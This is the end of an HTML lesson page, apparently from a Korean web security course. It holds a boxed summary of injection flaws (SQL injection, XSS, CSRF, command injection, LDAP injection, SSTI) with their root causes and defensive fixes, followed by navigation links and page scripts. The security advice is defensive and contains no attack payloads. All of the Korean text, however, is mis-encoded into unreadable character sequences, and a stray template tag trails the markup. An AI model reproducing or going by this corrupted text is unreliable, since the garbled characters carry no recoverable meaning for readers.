<div class="highlight"><pre><span></span><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          ì¸ì ì…˜ ê³µê²© ë° ë°©ì–´ ìš”ì•½                                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚  SQL Injection:                                                  â”‚
â”‚  - ê·¼ë³¸ ì›ì¸: ì¿¼ë¦¬ì˜ ë¬¸ìì—´ ì—°ê²°                                 â”‚
â”‚  - ìˆ˜ì •: ë§¤ê°œë³€ìˆ˜í™”ëœ ì¿¼ë¦¬, ORM                                  â”‚
â”‚  - ê¸°ì–µ: ìì²´ ë°ì´í„°ë² ì´ìŠ¤ì˜ ë°ì´í„°ë„ ë§¤ê°œë³€ìˆ˜í™” í•„ìš”             â”‚
â”‚                                                                  â”‚
â”‚  XSS (Cross-Site Scripting):                                    â”‚
â”‚  - ê·¼ë³¸ ì›ì¸: ì¸ì½”ë”© ì—†ì´ HTMLë¡œ ë Œë”ë§ëœ ì‚¬ìš©ì ì…ë ¥            â”‚
â”‚  - ìˆ˜ì •: ì»¨í…ìŠ¤íŠ¸ë³„ ì¶œë ¥ ì¸ì½”ë”© + CSP                            â”‚
â”‚  - DOM ì¡°ì‘ì— innerHTMLì´ ì•„ë‹Œ textContent ì‚¬ìš©                  â”‚
â”‚  - Jinja2 ìë™ ì´ìŠ¤ì¼€ì´í”„ + ì‚¬ìš©ì ì…ë ¥ê³¼ |safe ì ˆëŒ€ ì‚¬ìš© ê¸ˆì§€  â”‚
â”‚                                                                  â”‚
â”‚  CSRF:                                                           â”‚
â”‚  - ê·¼ë³¸ ì›ì¸: ìš”ì²­ì´ ìš°ë¦¬ ì‚¬ì´íŠ¸ì—ì„œ ì™”ëŠ”ì§€ í™•ì¸ ì—†ìŒ             â”‚
â”‚  - ìˆ˜ì •: CSRF í† í° + SameSite ì¿ í‚¤ + Origin í™•ì¸                â”‚
â”‚  - ëª¨ë“  ìƒíƒœ ë³€ê²½ ì—”ë“œí¬ì¸íŠ¸ì— ë°©ì–´ í•„ìš”                         â”‚
â”‚                                                                  â”‚
â”‚  Command Injection:                                              â”‚
â”‚  - ê·¼ë³¸ ì›ì¸: ì…¸ ëª…ë ¹ì˜ ì‚¬ìš©ì ì…ë ¥                              â”‚
â”‚  - ìˆ˜ì •: Python ë¼ì´ë¸ŒëŸ¬ë¦¬ (ì…¸ í”¼í•¨), ë¦¬ìŠ¤íŠ¸ë¡œ subprocess        â”‚
â”‚  - ì‚¬ìš©ì ì…ë ¥ê³¼ shell=True ì ˆëŒ€ ì‚¬ìš©í•˜ì§€ ì•Šê¸°                   â”‚
â”‚                                                                  â”‚
â”‚  LDAP Injection:                                                 â”‚
â”‚  - ê·¼ë³¸ ì›ì¸: LDAP í•„í„°ì˜ ë¬¸ìì—´ ì—°ê²°                            â”‚
â”‚  - ìˆ˜ì •: íŠ¹ìˆ˜ ë¬¸ì ì´ìŠ¤ì¼€ì´í”„, ì¸ì¦ì— LDAP bind ì‚¬ìš©             â”‚
â”‚                                                                  â”‚
â”‚  SSTI:                                                           â”‚
â”‚  - ê·¼ë³¸ ì›ì¸: í…œí”Œë¦¿ ë°ì´í„°ê°€ ì•„ë‹Œ í…œí”Œë¦¿ì˜ ì‚¬ìš©ì ì…ë ¥          â”‚
â”‚  - ìˆ˜ì •: ì‚¬ìš©ì ì…ë ¥ì„ í…œí”Œë¦¿ì´ ì•„ë‹Œ í…œí”Œë¦¿ ë³€ìˆ˜ë¡œ ì „ë‹¬          â”‚
â”‚  - render_template_string(f&quot;...{user_input}...&quot;) ì ˆëŒ€ ì‚¬ìš© ê¸ˆì§€ â”‚
â”‚                                                                  â”‚
â”‚  ì‹¬ì¸µ ë°©ì–´:                                                      â”‚
â”‚  ì…ë ¥ ê²€ì¦ â†’ ë§¤ê°œë³€ìˆ˜í™” â†’ ì¶œë ¥ ì¸ì½”ë”© â†’ CSP                     â”‚
â”‚  ë„¤ ê°€ì§€ ê³„ì¸µ ëª¨ë‘. ì˜ˆì™¸ ì—†ìŒ.                                   â”‚
â”‚                                                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre></div>

<hr />
<p><strong>ì´ì „</strong>: <a href="07_OWASP_Top10.md">07. OWASP Top 10 (2021)</a> | <strong>ë‹¤ìŒ</strong>: <a href="./09_Web_Security_Headers.md">09. ì›¹ ë³´ì•ˆ í—¤ë”ì™€ CSP</a></p>
    </div>

    
<div class="lesson-toolbar lesson-toolbar--bottom">
    <div class="toolbar-nav toolbar-nav--prev">
        
        <a href="/study/ko/Security/07_OWASP_Top10.html" class="nav-prev">
            <span class="nav-label">Previous</span>
            <span class="nav-title">07. OWASP Top 10 (2021)</span>
        </a>
        
    </div>
    <div class="toolbar-actions">
        <button class="btn btn-copy-link" data-action="copy-link" title="Copy link">
            <span class="icon">ğŸ”—</span>
            <span class="text">Copy link</span>
        </button>
        <a href="/study/ko/Security/" class="btn btn-topic-link" title="Back to topic list">
            <span class="icon">ğŸ“‹</span>
            <span class="text">Topic list</span>
        </a>
    </div>
    <div class="toolbar-nav toolbar-nav--next">
        
        <a href="/study/ko/Security/09_Web_Security_Headers.html" class="nav-next">
            <span class="nav-label">Next</span>
            <span class="nav-title">Web Security Headersì™€ CSP</span>
        </a>
        
    </div>
</div>


    <div class="toolbar-keyboard-hint">
        <kbd>&larr;</kbd> <kbd>&rarr;</kbd> to navigate between lessons
    </div>
</article>

<!-- Scroll to top floating button -->
<button class="scroll-to-top" id="scroll-to-top" title="Scroll to top" aria-label="Scroll to top">â†‘</button>

            </div>
        </main>
    </div>

    <script src="/study/static/js/app.js"></script>
    <script>
        function switchLanguage(newLang) {
            const path = window.location.pathname;
            const base = '/study';
            const currentLang = 'ko';
            const newPath = path.replace(base + '/' + currentLang + '/', base + '/' + newLang + '/');
            window.location.href = newPath + window.location.search;
        }
    </script>
    
<script>
    document.addEventListener('DOMContentLoaded', function() {
        // Copy link - independent feedback per button
        document.querySelectorAll('[data-action="copy-link"]').forEach(function(btn) {
            btn.addEventListener('click', function() {
                navigator.clipboard.writeText(window.location.href);
                var textEl = this.querySelector('.text');
                var originalText = textEl.textContent;
                textEl.textContent = 'Copied!';
                setTimeout(function() { textEl.textContent = originalText; }, 2000);
            });
        });

        // Add copy buttons to code blocks
        document.querySelectorAll('.lesson-content pre').forEach(function(pre) {
            var copyBtn = document.createElement('button');
            copyBtn.className = 'code-copy-btn';
            copyBtn.textContent = 'Copy';
            copyBtn.addEventListener('click', function() {
                var code = pre.querySelector('code');
                var text = code ? code.textContent : pre.textContent;
                navigator.clipboard.writeText(text);
                copyBtn.textContent = 'Copied!';
                setTimeout(function() { copyBtn.textContent = 'Copy'; }, 2000);
            });
            pre.style.position = 'relative';
            pre.appendChild(copyBtn);
        });

        // Scroll to top button
        var scrollBtn = document.getElementById('scroll-to-top');
        window.addEventListener('scroll', function() {
            scrollBtn.classList.toggle('visible', window.scrollY > 300);
        });
        scrollBtn.addEventListener('click', function() {
            window.scrollTo({ top: 0, behavior: 'smooth' });
        });

        // Keyboard shortcuts: left/right arrows for lesson navigation
        document.addEventListener('keydown', function(e) {
            var tag = document.activeElement.tagName;
            if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') return;

            if (e.key === 'ArrowLeft') {
                var prevLink = document.querySelector('.nav-prev');
                if (prevLink) prevLink.click();
            } else if (e.key === 'ArrowRight') {
                var nextLink = document.querySelector('.nav-next');
                if (nextLink) nextLink.click();
            }
        });
    });
</script>

</body>
</html>
{% endraw %}